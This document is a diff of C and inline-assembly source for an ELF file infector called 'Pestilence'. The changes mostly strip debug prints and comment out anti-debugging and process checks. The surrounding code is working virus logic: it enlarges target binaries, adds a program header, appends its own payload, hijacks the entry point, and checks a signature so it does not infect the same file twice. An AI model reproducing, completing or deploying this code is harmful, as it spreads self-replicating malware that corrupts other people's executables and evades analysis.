@@ -63,20 +63,22 @@ void _start(void)
 	char  path[11];
 	char *prgm;
 
+	/*
+	fs_release(1);
+	fs_release(2);
+
 	asm volatile("leaq str6(%%rip), %0\n"
 				 "jmp end6\n"
 				 "str6: .ascii \"doom-nukem\\0\"\n"
 				 "end6:\n"
 				 : "=r"(prgm));
 	if (is_debugged() || is_program_running(prgm) > 0)
-		proc_terminate(0);
+		proc_terminate(0);*/
+
 	__asm__ volatile("lea (%%rip), %0\n"
 					 "cyanure:"
 					 : "=r"(begin_ptr));
 	begin_ptr += FRENZY - CYANURE;
-
-	fs_release(1);
-	fs_release(2);
 
 	path[0] = '/';
 	path[1] = 't';
@@ -228,7 +230,7 @@ static int is_debugged(void)
 
 	while ((nread = io_recv(f, line + offset, sizeof(line) - offset)) > 0)
 	{
-		tty_putc(0);
+		// tty_putc(0);
 		offset += nread;
 		char *newline;
 
@@ -417,50 +419,47 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 	fd = fs_handle(path, O_RDWR);
 	if (fd < 0 || io_query(fd, statbuf) < 0)
 		goto error;
-	io_send(1, "after stat\n", 11);
 	if (statbuf->st_size < sizeof(ElfW(Ehdr)))
 		goto error;
-	io_send(1, "after size check\n", 17);
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size, PROT_READ,
 									MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
-	io_send(1, "after mmap\n", 11);
 	char  *ALPHA;
 	size_t OMEGA;
 	asm volatile(
 		"leaq str4(%%rip), %0\n"
-		"leaq (end4-str4)(%%rip), %1\n"
+		"movq $end4-str4, %1\n"
 		"jmp end4\n"
 		"str4: .ascii \"\\nPestilence version 1.0 (c)oded by xxxxxxx - "
-		"yyyyyy\\0\" \n"
+		"yyyyyy\\0\" \n "
 		"end4:\n"
 		: "=r"(ALPHA), "=r"(OMEGA));
 	int i = 0;
+	// tty_putc('[');
+	// emit_hex((unsigned long) OMEGA);
+	// tty_putc(']');
 	while (i + OMEGA < statbuf->st_size)
 		if (!evaluateDriftSignature(*file_data + i++, ALPHA, OMEGA))
 			goto error;
-	io_send(1, "after signature\n", 16);
-
+	// emit_hex(i);
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	*enlarging = VARAX;
 	*enlarging += elf->header->e_phentsize * (elf->header->e_phnum + 1);
 	*enlarging += 0x1000 - statbuf->st_size % 0x1000;
-	vm_release(file_data, statbuf->st_size);
+	vm_release(*file_data, statbuf->st_size);
+	*file_data = NULL;
 	if ((ret = io_resize(fd, statbuf->st_size + *enlarging)) < 0)
 	{
 		emit_hex(ret);
 		goto error;
 	}
-	io_send(1, "after resize\n", 13);
 	*file_data = (void *) rt_vector(9, 0, statbuf->st_size + *enlarging,
 									PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
 	if (*file_data == MAP_FAILED)
 		goto error;
-	io_send(1, "map ok\n", 7);
 	if (((unsigned *) *file_data)[0] != ELF_MAGIC)
 		goto error;
-	io_send(1, "after magic check\n", 19);
 	elf->header = (ElfW(Ehdr) *) *file_data;
 	if (statbuf->st_size < elf->header->e_shoff
 							   + elf->header->e_shnum * elf->header->e_shentsize
@@ -468,15 +467,11 @@ static int parse_file(char *path, inout struct stat *statbuf, inout t_elf *elf,
 			   < elf->header->e_phoff
 					 + elf->header->e_phnum * elf->header->e_phentsize)
 		goto error;
-	io_send(1, "after header check\n", 20);
 	elf->sections = (ElfW(Shdr) *) (*file_data + elf->header->e_shoff);
 	elf->segments = (ElfW(Phdr) *) (*file_data + elf->header->e_phoff);
 	fs_release(fd);
 	return (OK);
 error:
-	tty_putc('^');
-	emit_hex(ret);
-	io_send(1, ": nop nopnop\n", 13);
 	fs_release(fd);
 	return (KO);
 }
@@ -506,11 +501,8 @@ static void infect(char *path, void *begin_ptr)
 	size_t flower;
 	size_t enlarging;
 
-	tty_putc(10);
-	io_send(1, path, validate_environment(path));
-	tty_putc(10);
-	tty_putc('I');
-	tty_putc(10);
+	// tty_putc(10);
+	// io_send(1, path, validate_environment(path));
 	asm volatile(
 		"leaq str3(%%rip), %0\n"
 		"movq $end3-str3, %1\n"
@@ -520,21 +512,13 @@ static void infect(char *path, void *begin_ptr)
 		"0xff, 0xff, 0x58, 0xe9, 0xe5, 0xff, 0xff, 0xff\n"
 		"end3:\n"
 		: "=r"(curare), "=r"(flower)::"memory", "cc", "rax", "rcx", "r11");
-	emit_hex((unsigned long long) curare);
-	tty_putc('=');
-	emit_hex((unsigned long long) flower);
-	tty_putc(10);
 	if (parse_file(path, &statbuf, &elf, &file_data, &enlarging))
 		goto clean;
-	tty_putc('p');
-	tty_putc(10);
 	unsigned long append_pos
 		= statbuf.st_size + 0x1000 - statbuf.st_size % 0x1000;
 	unsigned long pestis = find_first_free_page(elf);
 	memcpy(file_data + append_pos, file_data + elf.header->e_phoff,
 		   elf.header->e_phnum * elf.header->e_phentsize);
-	tty_putc('M');
-	tty_putc(10);
 	elf.header->e_phoff = append_pos;
 	elf.segments = (ElfW(Phdr) *) (file_data + elf.header->e_phoff);
 	elf.segments[elf.header->e_phnum] = (ElfW(Phdr)) {
@@ -559,28 +543,13 @@ static void infect(char *path, void *begin_ptr)
 			elf.segments[i].p_filesz = elf.segments[i].p_memsz;
 		}
 	append_pos += elf.header->e_phnum * elf.header->e_phentsize;
-	emit_hex((unsigned long long) file_data + append_pos);
-	tty_putc('_');
-	emit_hex((unsigned long long) curare);
-	tty_putc('=');
-	emit_hex((unsigned long long) flower);
-	tty_putc(10);
 	memcpy(file_data + append_pos, curare, flower);
-	tty_putc('M');
-	tty_putc('2');
-	tty_putc(10);
 	unsigned delta = elf.header->e_entry;
 	elf.header->e_entry
 		= pestis + elf.header->e_phnum * elf.header->e_phentsize;
 	delta -= elf.header->e_entry + ACONIT + 4;
-	tty_putc('w');
-	emit_hex(delta);
-	tty_putc(10);
 	memcpy(file_data + append_pos + ACONIT, &delta, 4);
 	delta = flower - ARSENIC + BUBONIK - FRENZY - 4;
-	tty_putc(')');
-	emit_hex(delta);
-	tty_putc(10);
 	memcpy(file_data + append_pos + ARSENIC, &delta, 4);
 	append_pos += flower;
 	memcpy(file_data + append_pos, begin_ptr, VARAX);
